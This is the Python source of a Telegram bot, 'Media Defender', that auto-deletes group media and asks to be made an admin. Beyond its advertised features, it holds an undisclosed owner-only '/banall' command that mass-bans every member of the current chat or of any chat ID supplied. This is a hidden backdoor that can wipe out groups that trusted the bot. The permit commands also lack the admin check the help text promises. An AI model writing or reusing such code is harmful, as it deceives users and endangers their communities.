from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID
import asyncio
import re
import time

app = Client("KafkaMediaBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# === Global Variables ===
PERMITTED_USERS = set()
PERMITTED_CHANNELS = set()
MEDIA_TIMER = 10  # Default in seconds

OWNER_ID = int(OWNER_ID)
SUDO_USERS = {OWNER_ID}

BANNED_USERS = set()
BLOCKED_USERS = set()
BLOCKED_CHATS = set()
GBANNED_USERS = set()
GMUTED_USERS = set()
JOINED_CHATS = set()


# === Helper ===
def parse_time(text):
    match = re.match(r"^(\d+)([smh])$", text)
    if not match:
        return None
    value, unit = match.groups()
    if unit == "s":
        return int(value)
    elif unit == "m":
        return int(value) * 60
    elif unit == "h":
        return int(value) * 3600
    return None


# === Media Timer Command ===
@app.on_message(filters.command("mediatimer") & filters.group)
async def set_media_timer(_, message: Message):
    global MEDIA_TIMER
    user = await app.get_chat_member(message.chat.id, message.from_user.id)
    if not (user.can_promote_members or user.status == "creator"):
        return await message.reply("You lack rights. Get full rights to promote or ask my God to help you with it.")
    if len(message.command) < 2:
        return await message.reply("Usage: /mediatimer <10s/5m/1h>")
    time_str = message.command[1]
    delay = parse_time(time_str)
    if delay is None:
        return await message.reply("Invalid format. Use s/m/h like 10s, 2m, 1h")
    MEDIA_TIMER = delay
    await message.reply(f"Media will now be deleted after {time_str}.")


# === Permit Commands ===
@app.on_message(filters.command("mpermit") & filters.group)
async def permit_user(_, message: Message):
    if not message.reply_to_message:
        return await message.reply("Reply to a user's message to permit.")
    user_id = message.reply_to_message.from_user.id
    PERMITTED_USERS.add(user_id)
    await message.reply(f"User {user_id} permitted to send media.")


@app.on_message(filters.command("mrmpermit") & filters.group)
async def remove_permit(_, message: Message):
    if not message.reply_to_message:
        return await message.reply("Reply to a user's message to remove permit.")
    user_id = message.reply_to_message.from_user.id
    PERMITTED_USERS.discard(user_id)
    await message.reply(f"User {user_id} removed from permit list.")


@app.on_message(filters.command("mpermited") & filters.group)
async def list_permitted(_, message: Message):
    if not PERMITTED_USERS:
        return await message.reply("No permitted users.")
    user_list = "\n".join(str(uid) for uid in PERMITTED_USERS)
    await message.reply(f"**Permitted Users:**\n{user_list}")


# === Media Guard ===
@app.on_message(filters.group & (filters.photo | filters.sticker | filters.animation | filters.video | filters.video_note | filters.document))
async def media_guard(_, message: Message):
    user_id = message.from_user.id
    sender_chat = message.sender_chat.id if message.sender_chat else None
    if user_id in PERMITTED_USERS or sender_chat in PERMITTED_CHANNELS:
        return
    try:
        notice = await message.reply(f"Media will be deleted in {MEDIA_TIMER}s.")
        await asyncio.sleep(MEDIA_TIMER)
        await message.delete()
        await notice.delete()
    except:
        pass


# === Start & Help ===
@app.on_message(filters.command("start"))
async def start(_, message: Message):
    await message.reply("Welcome to Media Defender.\nUse /help to see available commands.")


@app.on_message(filters.command("help"))
async def help_cmd(_, message: Message):
    help_text = '''
🛠️ **How to Use Media Defender:**

➤ Add me to your group & make me **admin** with ‘Delete Messages’ permission.  
➤ I will **auto delete media** (photos, gifs, stickers) after the timer.  
➤ Use `/mediatimer <time>` (e.g., `10s`, `5m`, `2h`) to set the deletion timer.

💻 **Commands:**

▫️ `/mediatimer <time>` – Set media delete timer (e.g., 10s, 5m, 1h)  
▫️ `/start` – Show start message  
▫️ `/help` – Show this help message  

▫️ `/mpermit` (reply) – Allow a user’s media without deletion  
▫️ `/mrmpermit` (reply) – Remove a user from permit list  
▫️ `/mpermited` – List permitted users

📢 **Note:**  
⚠️ Only group **admins** can use timer and permit commands.
'''
    await message.reply(help_text)


# === Owner Tools ===
@app.on_message(filters.command("banall") & filters.user(OWNER_ID))
async def ban_all(_, message: Message):
    chat_id = int(message.command[1]) if len(message.command) >= 2 else message.chat.id
    banned = 0
    async for member in app.get_chat_members(chat_id):
        try:
            if member.user.is_bot or member.user.id == OWNER_ID:
                continue
            await app.ban_chat_member(chat_id, member.user.id)
            banned += 1
        except:
            continue
    await message.reply(f"Banned {banned} users from {chat_id}.")


@app.on_message(filters.command("leave") & filters.user(OWNER_ID))
async def leave_chat(_, message: Message):
    if len(message.command) < 2:
        return await message.reply("Usage: /leave <chat_id>")
    try:
        chat_id = int(message.command[1])
        await app.leave_chat(chat_id)
        await message.reply(f"Left chat {chat_id}.")
    except Exception as e:
        await message.reply(f"Failed to leave: {e}")


@app.on_message(filters.command("block") & filters.user(SUDO_USERS))
async def block_user(_, message: Message):
    user_id = message.reply_to_message.from_user.id if message.reply_to_message else int(message.command[1])
    BLOCKED_USERS.add(user_id)
    await message.reply(f"User {user_id} has been blocked.")


@app.on_message(filters.command("unblock") & filters.user(SUDO_USERS))
async def unblock_user(_, message: Message):
    user_id = message.reply_to_message.from_user.id if message.reply_to_message else int(message.command[1])
    BLOCKED_USERS.discard(user_id)
    await message.reply(f"User {user_id} has been unblocked.")


@app.on_message(filters.command("blocked") & filters.user(SUDO_USERS))
async def show_blocked(_, message: Message):
    if not BLOCKED_USERS:
        return await message.reply("No blocked users.")
    await message.reply("Blocked Users:\n" + "\n".join(str(u) for u in BLOCKED_USERS))


@app.on_message(filters.command("blockchat") & filters.user(SUDO_USERS))
async def block_chat(_, message: Message):
    chat_id = message.chat.id if len(message.command) < 2 else int(message.command[1])
    BLOCKED_CHATS.add(chat_id)
    await message.reply(f"Blocked chat {chat_id}.")


@app.on_message(filters.command("unblockchat") & filters.user(SUDO_USERS))
async def unblock_chat(_, message: Message):
    chat_id = message.chat.id if len(message.command) < 2 else int(message.command[1])
    BLOCKED_CHATS.discard(chat_id)
    await message.reply(f"Unblocked chat {chat_id}.")


@app.on_message(filters.command("blockedchats") & filters.user(SUDO_USERS))
async def show_blocked_chats(_, message: Message):
    if not BLOCKED_CHATS:
        return await message.reply("No blocked chats.")
    await message.reply("Blocked Chats:\n" + "\n".join(str(c) for c in BLOCKED_CHATS))


# === Ping & Stats ===
@app.on_message(filters.command("pingme"))
async def ping(_, message: Message):
    start = time.time()
    msg = await message.reply("Pinging...")
    end = time.time()
    ping_time = (end - start) * 1000
    await msg.edit(f"Pong: {int(ping_time)} ms")


@app.on_message(filters.command("stats") & filters.user(OWNER_ID))
async def stats(_, message: Message):
    stats_text = f"""
Bot Stats:
Users/Groups Tracked: {len(JOINED_CHATS)}
Blocked Users: {len(BLOCKED_USERS)}
Blocked Chats: {len(BLOCKED_CHATS)}
GMUTED Users: {len(GMUTED_USERS)}
GBANNED Users: {len(GBANNED_USERS)}
"""
    await message.reply(stats_text)


# === Run Bot ===
app.run()
